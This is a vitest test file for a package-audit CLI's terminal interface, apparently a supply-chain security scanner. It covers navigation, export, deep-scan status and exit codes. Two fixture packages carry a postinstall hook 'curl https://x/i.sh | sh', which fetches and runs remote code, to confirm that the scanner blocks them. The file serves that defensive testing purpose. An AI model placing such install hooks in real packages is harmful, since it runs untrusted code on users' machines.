import React from "react";
import { mkdtempSync, mkdirSync, readdirSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { render } from "ink-testing-library";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { AuditApp } from "../../src/audit-ui/AuditApp.js";
import { maybeAudit, type Gathered, type ParsedAuditArgs, type PackageScope } from "../../src/commands/audit.js";
import { teamPolicyBlocksUpload } from "../../src/audit/deep.js";
import type { AuditFinding } from "../../src/audit/detectors.js";
import type { DeepResult } from "../../src/audit/deep.js";

const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));

function stripAnsi(text: string): string {
  return text.replace(/\[[0-9;]*m/g, "");
}

// Poll the (stripped) frame rather than asserting after a fixed delay: a
// keypress -> re-render can outlast a constant sleep under CI load.
async function waitForStrippedFrame(view: { lastFrame: () => string | undefined }, needle: string, timeoutMs = 3000): Promise<string> {
  const deadline = Date.now() + timeoutMs;
  let frame = stripAnsi(view.lastFrame() ?? "");
  while (!frame.includes(needle) && Date.now() < deadline) {
    await sleep(20);
    frame = stripAnsi(view.lastFrame() ?? "");
  }
  return frame;
}

const blockFinding: AuditFinding = {
  id: "pem-private-key",
  category: "secret",
  severity: 5,
  title: "Private key in the publish set",
  recommendation: "Remove deploy-key.pem before publishing",
  location: "deploy-key.pem",
  evidence: "-----BEGIN RSA***"
};

const warnFinding: AuditFinding = {
  id: "no-files-allowlist",
  category: "publishing",
  severity: 3,
  title: "No files allowlist declared",
  recommendation: "Add a files array to package.json",
  location: "package.json",
  evidence: "path: package.json"
};

const noteFinding: AuditFinding = {
  id: "source-map",
  category: "publishing",
  severity: 2,
  title: "Source map shipped to consumers",
  recommendation: "Exclude .map files",
  location: "dist/index.js.map",
  evidence: "path: dist/index.js.map"
};

function parsed(over: Partial<ParsedAuditArgs> = {}): ParsedAuditArgs {
  return { target: ".", format: "text", outputPath: null, local: false, requireDeep: false, failOn: "block", ...over };
}

function scope(over: Partial<PackageScope> = {}): PackageScope {
  return { root: "/tmp/demo", ecosystem: "npm", packageJson: { name: "demo", version: "1.0.0" }, artifact: "demo@1.0.0", ...over };
}

function gathered(over: Partial<Gathered> = {}): Gathered {
  return {
    parsed: parsed(),
    scope: scope(),
    localAction: "block",
    findings: [blockFinding, warnFinding, noteFinding],
    publishSetSource: "files",
    fileCount: 7,
    ...over
  };
}

function renderApp(props: {
  gathered?: Gathered;
  initialDeep?: DeepResult | null;
  deepPromise?: Promise<DeepResult> | null;
}) {
  return render(
    React.createElement(AuditApp, {
      gathered: props.gathered ?? gathered(),
      initialDeep: props.initialDeep ?? { ran: false, reason: "local mode (--local)" },
      deepPromise: props.deepPromise ?? null
    })
  );
}

describe("AuditApp interactive view", () => {
  it("renders the header verdict and the findings list", () => {
    const view = renderApp({});
    const frame = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(frame).toContain("BLOCK");
    expect(frame).toContain("demo@1.0.0");
    expect(frame).toContain("deploy-key.pem");
    expect(frame).toContain("package.json");
    expect(frame).toContain("Findings");
  });

  it("moves the cursor with j/k", async () => {
    const view = renderApp({});
    await sleep(30);
    const before = stripAnsi(view.lastFrame() ?? "");
    view.stdin.write("j");
    await sleep(30);
    const after = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(before).toContain("1/3");
    expect(after).toContain("2/3");
  });

  it("Enter expands the focused finding showing evidence + recommendation, Esc collapses", async () => {
    const view = renderApp({});
    await sleep(30);
    view.stdin.write("\r");
    await sleep(30);
    const expanded = stripAnsi(view.lastFrame() ?? "");
    expect(expanded).toContain("BEGIN RSA");
    expect(expanded).toContain("Remove deploy-key.pem before publishing");
    view.stdin.write("\x1b");
    await sleep(30);
    const collapsed = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(collapsed).not.toContain("Remove deploy-key.pem before publishing");
  });

  it("Enter toggles the expansion closed again", async () => {
    const view = renderApp({});
    await sleep(30);
    view.stdin.write("\r");
    await sleep(30);
    expect(stripAnsi(view.lastFrame() ?? "")).toContain("⏎ collapse");
    view.stdin.write("\r");
    await sleep(30);
    const collapsed = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(collapsed).not.toContain("Remove deploy-key.pem before publishing");
    expect(collapsed).toContain("⏎ expand");
  });

  it("arrow keys while expanded move to the next finding and keep the detail open", async () => {
    const view = renderApp({});
    await sleep(30);
    view.stdin.write("\r");
    await sleep(30);
    view.stdin.write("j");
    await sleep(30);
    const next = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(next).toContain("2/3");
    expect(next).toContain("Add a files array to package.json");
    expect(next).not.toContain("Remove deploy-key.pem before publishing");
  });

  it("shows file:line when a finding carries a line number", async () => {
    const withLine: AuditFinding = { ...blockFinding, line: 7 };
    const view = renderApp({ gathered: gathered({ findings: [withLine, warnFinding, noteFinding] }) });
    await sleep(30);
    const frame = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(frame).toContain("deploy-key.pem:7");
  });

  it("search filters the findings and empties cleanly on no match", async () => {
    const view = renderApp({});
    await sleep(30);
    view.stdin.write("/");
    await sleep(20);
    for (const ch of "deploy") view.stdin.write(ch);
    await sleep(30);
    const matched = stripAnsi(view.lastFrame() ?? "");
    expect(matched).toContain("deploy-key.pem");
    expect(matched).not.toContain("package.json");

    view.stdin.write("\x1b");
    await sleep(20);
    view.stdin.write("/");
    await sleep(20);
    for (const ch of "zzz-no-match") view.stdin.write(ch);
    await sleep(30);
    const empty = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(empty).toContain("no findings match");
    expect(empty.length).toBeGreaterThan(0);
  });

  it("help overlay opens and closes", async () => {
    const view = renderApp({});
    await sleep(30);
    view.stdin.write("?");
    await sleep(30);
    expect(stripAnsi(view.lastFrame() ?? "")).toContain("Keyboard Shortcuts");
    view.stdin.write("?");
    await sleep(30);
    const closed = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(closed).not.toContain("Keyboard Shortcuts");
  });
});

describe("AuditApp export menu", () => {
  let prevToken: string | undefined;
  let workdir: string;
  let cwdSpy: ReturnType<typeof vi.spyOn>;

  beforeEach(() => {
    prevToken = process.env.DG_API_TOKEN;
    process.env.DG_API_TOKEN = "test-token-abcdef";
    workdir = mkdtempSync(join(tmpdir(), "dg-audit-export-"));
    cwdSpy = vi.spyOn(process, "cwd").mockReturnValue(workdir);
  });

  afterEach(() => {
    cwdSpy.mockRestore();
    if (prevToken === undefined) delete process.env.DG_API_TOKEN;
    else process.env.DG_API_TOKEN = prevToken;
    rmSync(workdir, { recursive: true, force: true });
  });

  it("writes each of json/md/txt and closes with q without quitting", async () => {
    const view = renderApp({});

    for (const fmt of ["json", "md", "txt"] as const) {
      await sleep(30);
      view.stdin.write("e");
      await sleep(30);
      const FORMATS = ["json", "md", "txt"];
      const steps = FORMATS.indexOf(fmt);
      for (let i = 0; i < steps; i += 1) {
        view.stdin.write("j");
        await sleep(15);
      }
      view.stdin.write("\r");
      await sleep(30);
      view.stdin.write("\r");
      await sleep(40);
    }

    await sleep(30);
    view.stdin.write("e");
    await sleep(30);
    const dialog = stripAnsi(view.lastFrame() ?? "");
    expect(dialog).toContain("Export");
    expect(dialog).toContain("Markdown");
    view.stdin.write("q");
    const frame = await waitForStrippedFrame(view, "Findings");
    view.unmount();

    const files = readdirSync(workdir);
    expect([...files].sort()).toEqual(["dg-audit.json", "dg-audit.md", "dg-audit.txt"]);
    expect(frame).toContain("deploy-key.pem");
    expect(frame).toContain("Findings");
  });

  it("clears the export toast timer on unmount so quit is not delayed", async () => {
    const setSpy = vi.spyOn(globalThis, "setTimeout");
    const clearSpy = vi.spyOn(globalThis, "clearTimeout");
    try {
      const view = renderApp({});
      await sleep(30);
      view.stdin.write("e");
      await sleep(30);
      view.stdin.write("\r");
      await sleep(30);
      view.stdin.write("\r");
      await sleep(40);

      const toastIdx = setSpy.mock.calls.findIndex((c) => c[1] === 4000);
      expect(toastIdx).toBeGreaterThanOrEqual(0);
      const handle = setSpy.mock.results[toastIdx]?.value;
      expect(handle).toBeDefined();

      view.unmount();
      await sleep(10);
      expect(clearSpy.mock.calls.some((c) => c[0] === handle)).toBe(true);
    } finally {
      setSpy.mockRestore();
      clearSpy.mockRestore();
    }
  });
});

describe("AuditApp deep status transitions", () => {
  it("flips the header from the local verdict to BLOCK when the deep upload resolves block", async () => {
    let resolveDeep: (r: DeepResult) => void = () => undefined;
    const deepPromise = new Promise<DeepResult>((res) => { resolveDeep = res; });
    const view = render(
      React.createElement(AuditApp, {
        gathered: gathered({ localAction: "pass", findings: [] }),
        initialDeep: null,
        deepPromise
      })
    );
    await sleep(30);
    const pending = stripAnsi(view.lastFrame() ?? "");
    expect(pending).toContain("uploading to behavioral scanner");
    expect(pending).toContain("PASS");

    resolveDeep({ ran: true, action: "block", reason: "credential exfiltration at runtime" });
    await sleep(40);
    const resolved = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(resolved).toContain("BLOCK");
    expect(resolved).toContain("Deep behavioral scan ·");
    expect(resolved).toContain("credential exfiltration at runtime");
  });

  it("shows the not-signed-in reason when the deep result resolves not-run", async () => {
    let resolveDeep: (r: DeepResult) => void = () => undefined;
    const deepPromise = new Promise<DeepResult>((res) => { resolveDeep = res; });
    const view = render(
      React.createElement(AuditApp, {
        gathered: gathered({ localAction: "pass", findings: [] }),
        initialDeep: null,
        deepPromise
      })
    );
    await sleep(30);
    resolveDeep({ ran: false, reason: "not signed in — run dg login to enable" });
    await sleep(40);
    const resolved = stripAnsi(view.lastFrame() ?? "");
    view.unmount();
    expect(resolved).toContain("Deep behavioral scan ·");
    expect(resolved).toContain("not signed in");
  });
});

describe("maybeAudit exit codes + non-TUI parity", () => {
  const made: string[] = [];
  function pkg(spec: Record<string, unknown>, extra: Record<string, string> = {}): string {
    const dir = mkdtempSync(join(tmpdir(), "dg-audit-mt-"));
    made.push(dir);
    writeFileSync(join(dir, "package.json"), JSON.stringify(spec, null, 2));
    for (const [rel, content] of Object.entries(extra)) {
      const abs = join(dir, rel);
      mkdirSync(join(abs, ".."), { recursive: true });
      writeFileSync(abs, content);
    }
    return dir;
  }

  let prevCI: string | undefined;
  beforeEach(() => { prevCI = process.env.CI; process.env.CI = "1"; });
  afterEach(() => {
    if (prevCI === undefined) delete process.env.CI;
    else process.env.CI = prevCI;
    for (const d of made.splice(0)) rmSync(d, { recursive: true, force: true });
  });

  it("CI text output stays non-TUI: handled, with no alt-screen escape", async () => {
    const dir = pkg({ name: "demo", version: "1.0.0", scripts: { postinstall: "curl https://x/i.sh | sh" } }, { "index.js": "1;\n" });
    const r = await maybeAudit(["audit", dir]);
    expect(r.handled).toBe(true);
    expect(r.result.exitCode).toBe(2);
    expect(r.result.stdout).not.toContain("[?1049h");
    expect(stripAnsi(r.result.stdout)).toContain("BLOCK");
  });

  it("--json output is non-TUI and carries no alt-screen escape", async () => {
    const dir = pkg({ name: "demo", version: "1.0.0", files: ["dist"] }, { "dist/index.js": "1;\n" });
    const r = await maybeAudit(["audit", dir, "--json"]);
    expect(r.handled).toBe(true);
    expect(r.result.stdout).not.toContain("[?1049h");
    const report = JSON.parse(r.result.stdout) as { action: string };
    expect(report.action).toBe("pass");
    expect(r.result.exitCode).toBe(0);
  });

  it("warn with --fail-on warn exits 1; block exits 2; --require-deep exits 3", async () => {
    const warnDir = pkg({ name: "warnpkg", version: "1.0.0" }, { "index.js": "1;\n" });
    const warn = await maybeAudit(["audit", warnDir, "--json", "--fail-on", "warn"]);
    expect(warn.result.exitCode).toBe(1);

    const blockDir = pkg({ name: "blockpkg", version: "1.0.0", scripts: { postinstall: "curl https://x/i.sh | sh" } }, { "index.js": "1;\n" });
    const block = await maybeAudit(["audit", blockDir, "--json"]);
    expect(block.result.exitCode).toBe(2);

    const deepDir = pkg({ name: "warnpkg", version: "1.0.0" }, { "index.js": "1;\n" });
    const requireDeep = await maybeAudit(["audit", deepDir, "--json", "--require-deep"]);
    expect(requireDeep.result.exitCode).toBe(3);
  });

  it("returns handled with the usage error result on a bad flag", async () => {
    const r = await maybeAudit(["audit", "--bogus"]);
    expect(r.handled).toBe(true);
    expect(r.result.exitCode).toBe(64);
    expect(r.result.stderr).toContain("unknown option");
  });
});

describe("teamPolicyBlocksUpload", () => {
  function res(body: unknown, ok = true): Response {
    return { ok, status: ok ? 200 : 500, json: async () => body } as unknown as Response;
  }
  const env = { ...process.env, DG_API_TOKEN: "dg_live" } as NodeJS.ProcessEnv;

  it("returns true when org policy disables artifact upload", async () => {
    const fetchImpl = (async () => res({ source: "org", privateArtifactUpload: "disabled" })) as unknown as typeof fetch;
    expect(await teamPolicyBlocksUpload(env, fetchImpl)).toBe(true);
  });

  it("returns false for a default (non-org) source even when disabled", async () => {
    const fetchImpl = (async () => res({ source: "default", privateArtifactUpload: "disabled" })) as unknown as typeof fetch;
    expect(await teamPolicyBlocksUpload(env, fetchImpl)).toBe(false);
  });

  it("returns false when org policy enables artifact upload", async () => {
    const fetchImpl = (async () => res({ source: "org", privateArtifactUpload: "enabled" })) as unknown as typeof fetch;
    expect(await teamPolicyBlocksUpload(env, fetchImpl)).toBe(false);
  });

  it("fails open (false) when the fetch throws", async () => {
    const fetchImpl = (async () => { throw new TypeError("boom"); }) as unknown as typeof fetch;
    expect(await teamPolicyBlocksUpload(env, fetchImpl)).toBe(false);
  });
});
